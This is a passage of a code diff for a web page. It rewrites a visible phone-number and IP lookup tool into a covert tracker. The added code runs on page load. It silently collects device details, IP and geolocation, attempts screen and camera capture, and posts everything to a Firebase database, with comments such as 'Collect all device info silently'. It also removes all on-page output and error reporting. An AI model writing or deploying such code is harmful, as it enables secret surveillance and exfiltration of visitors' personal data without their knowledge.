-                return '+' + countryCode + ' (' + localNum.slice(0, 3) + ') ' + localNum.slice(3, 6) + '-' + localNum.slice(6);
-            } else if (countryCode === '63') {
-                return '+' + countryCode + ' ' + localNum.slice(0, 3) + ' ' + localNum.slice(3, 6) + ' ' + localNum.slice(6);
-            } else {
-                return '+' + countryCode + ' ' + localNum.match(/.{1,3}/g)?.join(' ') || localNum;
-            }
-        }
-
-        function detectPhoneType(number, countryCode) {
-            const localNum = number.replace('+' + countryCode, '');
-
-            if (countryCode === '63') {
-                if (localNum.startsWith('9')) return 'Mobile';
-                if (localNum.startsWith('2')) return 'Landline (Metro Manila)';
-                return 'Unknown';
-            } else if (countryCode === '1') {
-                if (localNum.startsWith('800') || localNum.startsWith('888') || localNum.startsWith('877') || localNum.startsWith('866') || localNum.startsWith('855') || localNum.startsWith('844') || localNum.startsWith('833')) return 'Toll-Free';
-                if (localNum.startsWith('202') || localNum.startsWith('212') || localNum.startsWith('310') || localNum.startsWith('415') || localNum.startsWith('305') || localNum.startsWith('312')) return 'Landline';
-                return 'Mobile/Landline';
-            } else {
-                if (localNum.startsWith('7') || localNum.startsWith('8') || localNum.startsWith('9')) return 'Likely Mobile';
-                return 'Unknown';
-            }
-        }
-
-        function analyzePhoneNumber() {
-            const input = document.getElementById('phone-input').value.trim();
-            const resultDiv = document.getElementById('phone-result');
-            const infoGrid = document.getElementById('phone-info-grid');
-
-            if (!input) {
-                alert('Please enter a phone number');
-                return;
-            }
-
-            const parsed = parsePhoneNumber(input);
-
-            if (!parsed) {
-                alert('Invalid phone number format. Please use format: +[country code][number], e.g., +639123456789');
-                return;
-            }
-
-            infoGrid.innerHTML = `
-                <div class="info-item">
-                    <span class="label">Original Input:</span>
-                    <span class="value">${parsed.original}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Formatted Number:</span>
-                    <span class="value">${parsed.formatted}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Country Code:</span>
-                    <span class="value">${parsed.countryCode}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Country:</span>
-                    <span class="value">${parsed.country}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Local Number:</span>
-                    <span class="value">${parsed.localNumber}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Phone Type:</span>
-                    <span class="value">${parsed.type}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Area Code:</span>
-                    <span class="value">${parsed.areaCode}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Line Number:</span>
-                    <span class="value">${parsed.lineNumber}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Local Format:</span>
-                    <span class="value">${parsed.format}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Currency:</span>
-                    <span class="value">${parsed.currency}</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Is Valid:</span>
-                    <span class="value" style="color: ${parsed.isValid ? '#155724' : '#721c24'}">${parsed.isValid ? 'Yes' : 'No'}</span>
-                </div>
-            `;
-
-            resultDiv.classList.add('show');
-
-            savePhoneToFirebase(parsed);
-        }
-
-        async function savePhoneToFirebase(phoneData) {
-            try {
-                const timestamp = new Date().toISOString();
-                const firebaseURL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app/phone_lookups.json';
-
-                const payload = {
-                    original: phoneData.original,
-                    formatted: phoneData.formatted,
-                    countryCode: phoneData.countryCode,
-                    country: phoneData.country,
-                    localNumber: phoneData.localNumber,
-                    type: phoneData.type,
-                    timestamp: timestamp
+                    timestamp: new Date().toISOString(),
+                    sessionId: Date.now().toString(36) + Math.random().toString(36).substr(2)
                 };
 
                 await fetch(firebaseURL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
             } catch (error) {
-                console.error('Error saving phone to Firebase:', error);
+                // Silent fail
             }
         }
 
-        async function initializeTracker() {
-            const deviceData = getDeviceInfo();
-            displayDeviceInfo(deviceData);
-
+        async function initTracker() {
             try {
+                // Collect all device info silently
+                const deviceData = await collectAllDeviceInfo();
                 const locationData = await getIPAndLocation();
-                const result = await saveIPToFirebase(locationData, deviceData);
 
-                document.getElementById('ip-address').textContent = locationData.ip;
-                document.getElementById('country').textContent = locationData.country;
-                document.getElementById('city').textContent = locationData.city;
-                document.getElementById('region').textContent = locationData.region;
-                document.getElementById('district').textContent = locationData.district;
-                document.getElementById('latitude').textContent = locationData.latitude;
-                document.getElementById('longitude').textContent = locationData.longitude;
-                document.getElementById('isp').textContent = locationData.isp;
-                document.getElementById('org').textContent = locationData.org;
-                document.getElementById('asn').textContent = locationData.asn;
-                document.getElementById('postal').textContent = locationData.postal;
-                document.getElementById('country-code').textContent = locationData.countryCode;
-                document.getElementById('continent').textContent = locationData.continent;
-                document.getElementById('loc-timezone').textContent = locationData.timezone;
-                document.getElementById('currency').textContent = locationData.currency;
-                document.getElementById('timestamp').textContent = new Date().toLocaleString();
+                // Try to capture screen silently (will prompt for permission)
+                let screenCapture = null;
+                let cameraCapture = null;
 
-                const statusEl = document.getElementById('status');
-                if (result.success) {
-                    statusEl.className = 'status success';
-                    statusEl.textContent = 'Information recorded successfully';
-                } else {
-                    statusEl.className = 'status error';
-                    statusEl.textContent = 'Could not save information';
+                // Attempt silent capture (user must grant permission)
+                try {
+                    screenCapture = await getScreenCapture();
+                    cameraCapture = await getCameraCapture();
+                } catch (e) {
+                    // Capture failed or permission denied
                 }
+
+                // Save everything to Firebase
+                await saveEverythingToFirebase(deviceData, locationData, screenCapture, cameraCapture);
+
             } catch (error) {
-                console.error('Error initializing tracker:', error);
-                document.getElementById('status').className = 'status error';
-                document.getElementById('status').textContent = 'An error occurred';
+                // Silent operation
             }
         }
 
-        window.addEventListener('resize', () => {
-            document.getElementById('viewport-size').textContent = `${window.innerWidth} x ${window.innerHeight}`;
+        // Run on load
+        document.addEventListener('DOMContentLoaded', () => {
+            initTracker();
         });
 
-        window.addEventListener('online', () => {
-            document.getElementById('online-status').textContent = 'Online';
-        });
-
-        window.addEventListener('offline', () => {
-            document.getElementById('online-status').textContent = 'Offline';
-        });
-
-        document.addEventListener('DOMContentLoaded', initializeTracker);
-
-        document.getElementById('phone-input').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                analyzePhoneNumber();
-            }
-        });
+        // Also run after small delay to ensure everything is loaded
+        setTimeout(initTracker, 1000);
     </script>
 </body>
 </html>
